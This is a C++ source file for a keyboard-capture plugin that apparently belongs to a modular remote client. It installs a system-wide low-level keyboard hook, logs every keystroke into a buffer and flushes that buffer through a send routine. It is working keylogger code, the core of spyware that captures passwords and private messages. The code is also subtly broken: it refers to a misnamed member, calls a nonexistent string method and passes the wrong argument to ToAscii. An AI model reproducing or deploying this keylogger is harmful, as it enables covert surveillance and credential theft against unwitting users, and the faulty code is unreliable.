//
// Created by Benoit Hamon on 10/3/2017.
//

#include <iostream>
#include <boost/dll/alias.hpp> // for BOOST_DLL_ALIAS

#include "ModuleKeyboard.hpp"

static std::string g_keys;

ModuleKeyboard::ModuleKeyboard(Client &client) : _client(client) {}

LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM lParam ) {
  char pressedKey;
  auto pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
  switch(wParam) {
    case WM_KEYUP:
    {
      pressedKey = (char)pKeyBoard->vkCode;
    }
      break;
    default:
      return CallNextHookEx(nullptr, nCode, wParam, lParam );
  }

  switch (pressedKey) {
    case VK_RETURN: g_keys += "\n"; break;
    case VK_CONTROL: g_keys += "[Ctrl]"; break;
    case VK_MENU : g_keys += "[Alt]"; break;
    case VK_DELETE: g_keys += "[DEL]"; break;
    case VK_BACK: g_keys += "[<===)]"; break;
    case VK_LEFT : g_keys += "[<-]"; break;
    case VK_RIGHT  : g_keys += "[->]";break;
    case VK_TAB : g_keys += "[TAB]"; break;
    case VK_END : g_keys += "[Fin]"; break;
    default:
      BYTE keyboard_state[256];
      GetKeyboardState(keyboard_state);
      WORD c;
      UINT ScanCode=0;
      ToAscii(wParam, ScanCode, keyboard_state, &c, 0);
      g_keys += (char)c;
      break;
  }
  return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void ModuleKeyboard::start(ModuleCommunication &com) {
  this->_running = true;
  HINSTANCE instance = GetModuleHandle(nullptr);
  HHOOK hook = SetWindowsHookEx( WH_KEYBOARD_LL, ModuleKeyboard::hookCallback, instance,0);

  MSG msg;
  while (!GetMessage(&msg, nullptr, 0, 0) && this->__running) {
    this->sendKeys();
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(hook);
}

boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create(Client &client) {
  return boost::shared_ptr<ModuleKeyboard>(
          new ModuleKeyboard(client)
  );
}

void ModuleKeyboard::sendKeys() {
  if (g_keys.len() > 5) {
    std::cout << g_keys << std::endl;
    g_keys.clear();
  }
}

BOOST_DLL_ALIAS(ModuleKeyboard::create, create_module)
